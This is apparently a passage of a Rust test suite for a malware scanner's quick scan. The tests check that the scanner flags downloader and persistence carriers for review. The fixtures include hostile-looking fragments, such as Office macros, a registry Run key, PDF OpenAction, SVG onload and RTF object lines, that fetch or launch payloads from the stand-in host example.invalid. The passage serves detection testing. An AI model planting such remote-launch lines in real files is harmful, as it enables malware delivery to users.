                "expected Batch carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(batch.exists());
        assert!(command.exists());
    }

    #[test]
    fn quick_scan_reports_vbs_carrier_files_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let script = downloads.join("support.vbs");
        let encoded_script = downloads.join("support.vbe");
        let vbs_carrier_fixture =
            b"base64 marker: Set x = CreateObject(\"MSXML2.XMLHTTP\"): Set s = CreateObject(\"WScript.Shell\")";
        fs::write(&script, vbs_carrier_fixture).unwrap();
        fs::write(&encoded_script, vbs_carrier_fixture).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support.vbs", "support.vbe"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && matches!(
                            threat.detection_type,
                            DetectionType::Signature | DetectionType::Heuristic
                        )
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "encoded_script_command")
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "download_execute_script")
                }),
                "expected VBS carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(script.exists());
        assert!(encoded_script.exists());
    }

    #[test]
    fn quick_scan_reports_script_host_carrier_files_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let hta = downloads.join("support-ticket.hta");
        let wsf = downloads.join("support-ticket.wsf");
        let script_host_fixture =
            b"base64 marker; Set x = CreateObject(\"MSXML2.XMLHTTP\"); CreateObject(\"WScript.Shell\")";
        fs::write(&hta, script_host_fixture).unwrap();
        fs::write(&wsf, script_host_fixture).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support-ticket.hta", "support-ticket.wsf"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && threat.risk_score.verdict == RiskVerdict::ProbableMalware
                        && threat.confidence == ThreatConfidence::High
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "encoded_script_command")
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "download_execute_script")
                }),
                "expected script-host carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(hta.exists());
        assert!(wsf.exists());
    }

    #[test]
    fn quick_scan_reports_windows_scriptlet_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let scriptlet = downloads.join("loader.sct");
        let component = downloads.join("component.wsc");
        fs::write(
            &scriptlet,
            br#"<scriptlet>
<registration progid="Support.Loader" />
<script language="JScript">var x = GetObject("script:https://example.invalid/loader.sct");</script>
</scriptlet>"#,
        )
        .unwrap();
        fs::write(
            &component,
            br#"<component><registration progid="Support.Component" />
<script language="VBScript">CreateObject("WScript.Shell"): x="downloadstring"</script>
</component>"#,
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["loader.sct", "component.wsc"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "windows_scriptlet_remote_script_launch")
                }),
                "expected Windows scriptlet carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(scriptlet.exists());
        assert!(component.exists());
    }

    #[test]
    fn quick_scan_reports_registry_and_shortcut_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let registry = downloads.join("autorun.reg");
        let shortcut = downloads.join("support.url");
        let shell_link = downloads.join("support-link.lnk");
        let network_link = downloads.join("support-share.lnk");
        fn utf16le_bytes(text: &str) -> Vec<u8> {
            let mut bytes = Vec::new();
            for unit in text.encode_utf16() {
                bytes.extend_from_slice(&unit.to_le_bytes());
            }
            bytes
        }
        fs::write(
            &registry,
            br#"
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Updater"="powershell https://example.invalid/update.ps1"
"#,
        )
        .unwrap();
        fs::write(
            &shortcut,
            b"[InternetShortcut]\nURL=https://example.invalid/support.exe",
        )
        .unwrap();
        fs::write(
            &shell_link,
            utf16le_bytes("Shell link target https://example.invalid/support.ps1 cmd.exe"),
        )
        .unwrap();
        fs::write(
            &network_link,
            utf16le_bytes(r"Shell link target \\fileserver\share\support.ps1"),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "autorun.reg"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::PersistenceIndicator
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "registry_autorun_remote_launch")
            }),
            "expected registry autorun carrier review detection: {report:#?}"
        );
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "support.url"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::SuspiciousDownloader
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "shortcut_remote_executable_launch")
            }),
            "expected shortcut downloader carrier review detection: {report:#?}"
        );
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "support-link.lnk"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::SuspiciousDownloader
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "shortcut_remote_executable_launch")
            }),
            "expected LNK downloader carrier review detection: {report:#?}"
        );
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "support-share.lnk"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::SuspiciousDownloader
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "shortcut_remote_executable_launch")
            }),
            "expected LNK UNC downloader carrier review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(registry.exists());
        assert!(shortcut.exists());
        assert!(shell_link.exists());
        assert!(network_link.exists());
    }

    #[test]
    fn quick_scan_reports_clickonce_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let manifest = downloads.join("support.application");
        let appref = downloads.join("support.appref-ms");
        fs::write(
            &manifest,
            br#"<assembly xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
<asmv2:deployment install="true">
<asmv2:deploymentProvider codebase="https://example.invalid/setup.exe" />
</asmv2:deployment>
</assembly>"#,
        )
        .unwrap();
        fs::write(
            &appref,
            b"https://example.invalid/Support.application#Support, Culture=neutral",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support.application", "support.appref-ms"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "clickonce_remote_deployment_launch")
                }),
                "expected ClickOnce carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(manifest.exists());
        assert!(appref.exists());
    }

    #[test]
    fn quick_scan_reports_windows_appinstaller_carrier_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let manifest = downloads.join("support.appinstaller");
        let docs_manifest = downloads.join("docs.appinstaller");
        fs::write(
            &manifest,
            br#"<AppInstaller Uri="https://example.invalid/support.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/packages/support.msixbundle" />
</AppInstaller>"#,
        )
        .unwrap();
        fs::write(
            &docs_manifest,
            br#"<AppInstaller Uri="https://example.invalid/docs.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Docs" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/readme.html" />
</AppInstaller>"#,
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "support.appinstaller"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::SuspiciousDownloader
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "windows_appinstaller_remote_package_launch")
            }),
            "expected Windows App Installer carrier review detection: {report:#?}"
        );
        assert!(!report
            .threats
            .iter()
            .any(|threat| threat.file_name == "docs.appinstaller"));
        assert_eq!(report.quarantined_files, 0);
        assert!(manifest.exists());
        assert!(docs_manifest.exists());
    }

    #[test]
    fn quick_scan_reports_windows_installer_custom_action_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let installer = downloads.join("support-installer.msi");
        let patch = downloads.join("support-patch.msp");
        let mut installer_bytes = compound_file_fixture();
        installer_bytes.extend_from_slice(
            b"Windows Installer CustomAction WixQuietExec https://example.invalid/patch.msp",
        );
        fs::write(&installer, installer_bytes).unwrap();
        fs::write(
            &patch,
            b"MsiPatchMetadata CustomAction WixQuietExec powershell downloadstring",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support-installer.msi", "support-patch.msp"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat.risk_score.reasons.iter().any(|reason| {
                            reason.id == "windows_installer_custom_action_remote_launch"
                        })
                }),
                "expected Windows Installer custom-action carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(installer.exists());
        assert!(patch.exists());
    }

    #[test]
    fn quick_scan_reports_java_web_start_carrier_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let launch = downloads.join("support.jnlp");
        fs::write(
            &launch,
            br#"<jnlp spec="1.0+" codebase="https://example.invalid/app/">
<information><title>Support</title></information>
<resources><jar href="https://example.invalid/app/support.jar" /></resources>
<application-desc main-class="com.example.Support" />
</jnlp>"#,
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "support.jnlp"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::SuspiciousDownloader
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "java_web_start_remote_archive_launch")
            }),
            "expected Java Web Start carrier review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(launch.exists());
    }

    #[test]
    fn quick_scan_reports_autorun_inf_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let local_autorun = downloads.join("autorun.inf");
        let network_autorun = downloads.join("media-autorun.inf");
        fs::write(
            &local_autorun,
            br#"
[autorun]
open=support.exe /quiet
shell\open\command=cmd.exe /c support.cmd
"#,
        )
        .unwrap();
        fs::write(
            &network_autorun,
            br#"
[autorun]
shellexecute=file://fileserver/share/support.vbs
"#,
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["autorun.inf", "media-autorun.inf"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::PersistenceIndicator
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "autorun_inf_executable_launch")
                }),
                "expected autorun INF carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(local_autorun.exists());
        assert!(network_autorun.exists());
    }

    #[test]
    fn quick_scan_reports_email_attachment_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let email = downloads.join("invoice-email.eml");
        fs::write(
            &email,
            br#"From: billing@example.invalid
Subject: invoice
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b"

--b
Content-Type: application/octet-stream; name="invoice.exe"
Content-Disposition: attachment; filename="invoice.exe"

placeholder
--b--
"#,
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "invoice-email.eml"
                    && threat.detection_type == DetectionType::Heuristic
                    && matches!(
                        threat.threat_category,
                        ThreatCategory::SuspiciousDownloader | ThreatCategory::SuspiciousScript
                    )
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "email_executable_attachment")
            }),
            "expected EML attachment carrier review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(email.exists());
    }

    #[test]
    fn quick_scan_reports_office_query_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let query = downloads.join("remote-query.iqy");
        let spreadsheet = downloads.join("spreadsheet-link.slk");
        fs::write(&query, b"WEB\n1\nhttps://example.invalid/payload.ps1").unwrap();
        fs::write(
            &spreadsheet,
            b"ID;PWXL;N;E\nC;X1;Y1;K\"powershell https://example.invalid/update.ps1\"",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["remote-query.iqy", "spreadsheet-link.slk"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "office_query_remote_script_launch")
                }),
                "expected Office query/spreadsheet carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(query.exists());
        assert!(spreadsheet.exists());
    }

    #[test]
    fn quick_scan_reports_macro_enabled_office_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("invoice.docm");
        let workbook = downloads.join("budget.xlsm");
        let deck = downloads.join("briefing.pptm");
        let macro_carrier_fixture =
            b"Sub AutoOpen()\npowershell https://example.invalid/payload.ps1\nEnd Sub";
        fs::write(&document, macro_carrier_fixture).unwrap();
        fs::write(&workbook, macro_carrier_fixture).unwrap();
        fs::write(&deck, macro_carrier_fixture).unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["invoice.docm", "budget.xlsm", "briefing.pptm"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::MaliciousMacro
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "office_macro_auto_run_remote_launch")
                }),
                "expected macro-enabled Office carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
        assert!(workbook.exists());
        assert!(deck.exists());
    }

    #[test]
    fn quick_scan_reports_legacy_office_macro_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("invoice-legacy.doc");
        let workbook = downloads.join("budget-legacy.xls");
        let deck = downloads.join("briefing-legacy.ppt");
        fs::write(
            &document,
            b"Sub AutoOpen()\npowershell https://example.invalid/payload.ps1\nEnd Sub",
        )
        .unwrap();
        fs::write(
            &workbook,
            b"Private Sub Workbook_Open()\n\\\\fileserver\\share\\support.vbs\nEnd Sub",
        )
        .unwrap();
        fs::write(
            &deck,
            b"Sub Presentation_Open()\nwscript.shell downloadstring start-process\nEnd Sub",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in [
            "invoice-legacy.doc",
            "budget-legacy.xls",
            "briefing-legacy.ppt",
        ] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::MaliciousMacro
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "office_macro_auto_run_remote_launch")
                }),
                "expected legacy Office macro carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
        assert!(workbook.exists());
        assert!(deck.exists());
    }

    #[test]
    fn quick_scan_reports_rtf_object_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let remote_object = downloads.join("invoice-object.rtf");
        let linked_field = downloads.join("support-field.rtf");
        fs::write(
            &remote_object,
            br"{\rtf1{\object\objautlink\objupdate https://example.invalid/payload.ps1}}",
        )
        .unwrap();
        fs::write(
            &linked_field,
            br"{\rtf1{\field{\*\fldinst INCLUDETEXT file://fileserver/share/support.vbs}}}",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["invoice-object.rtf", "support-field.rtf"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "rtf_external_object_remote_launch")
                }),
                "expected RTF external object carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(remote_object.exists());
        assert!(linked_field.exists());
    }

    #[test]
    fn quick_scan_reports_pdf_active_content_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let remote_action = downloads.join("invoice-action.pdf");
        let launch_action = downloads.join("support-launch.pdf");
        fs::write(
            &remote_action,
            b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL('https://example.invalid/payload.js')) >> >>\nendobj",
        )
        .unwrap();
        fs::write(
            &launch_action,
            b"%PDF-1.7\n2 0 obj << /OpenAction << /S /Launch /F (file://fileserver/share/support.vbs) >> >>\nendobj",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["invoice-action.pdf", "support-launch.pdf"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "pdf_active_content_remote_launch")
                }),
                "expected PDF active-content carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(remote_action.exists());
        assert!(launch_action.exists());
    }

    #[test]
    fn quick_scan_reports_web_document_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let html_loader = downloads.join("invoice-web.html");
        let svg_loader = downloads.join("diagram-loader.svg");
        fs::write(
            &html_loader,
            br#"<!doctype html><html><script>const u='https://example.invalid/payload.js'; const a=document.createElement('a'); a.download='payload.js';</script></html>"#,
        )
        .unwrap();
        fs::write(
            &svg_loader,
            br#"<svg onload="fetch('https://example.invalid/payload.js')"></svg>"#,
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["invoice-web.html", "diagram-loader.svg"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "web_document_active_content_remote_launch")
                }),
                "expected web-document carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(html_loader.exists());
        assert!(svg_loader.exists());
    }

    #[test]
    fn quick_scan_reports_ooxml_macro_external_relationships_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("invoice-package.docm");
        let workbook = downloads.join("budget-package.xlsm");
        let deck = downloads.join("briefing-package.pptm");
        fs::write(
            &document,
            ooxml_macro_package(
                b"word/vbaProject.bin",
                b"word/_rels/document.xml.rels",
                br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#,
            ),
        )
        .unwrap();
        fs::write(
            &workbook,
            ooxml_macro_package(
                b"xl/vbaProject.bin",
                b"xl/_rels/workbook.xml.rels",
                br#"<Relationship TargetMode="External" Target="file://fileserver/share/support.vbs"/>"#,
            ),
        )
        .unwrap();
        fs::write(
            &deck,
            ooxml_macro_package(
                b"ppt/vbaProject.bin",
                b"ppt/_rels/presentation.xml.rels",
                br#"<Relationship TargetMode="External" Target="https://example.invalid/presenter.js"/>"#,
            ),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in [
            "invoice-package.docm",
            "budget-package.xlsm",
            "briefing-package.pptm",
        ] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::MaliciousMacro
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "ooxml_macro_external_remote_relationship")
                }),
                "expected OOXML macro relationship review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
        assert!(workbook.exists());
        assert!(deck.exists());
    }

    #[test]
    fn quick_scan_reports_deflated_ooxml_macro_relationship_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("compressed-invoice.docm");
        fs::write(
            &document,
            ooxml_macro_package_with_methods(&[
                (
                    b"word/vbaProject.bin".as_slice(),
                    0,
                    b"macro project placeholder".as_slice(),
                ),
                (
                    b"word/_rels/document.xml.rels".as_slice(),
                    8,
                    br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#.as_slice(),
                ),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "compressed-invoice.docm"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::MaliciousMacro
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ooxml_macro_external_remote_relationship")
            }),
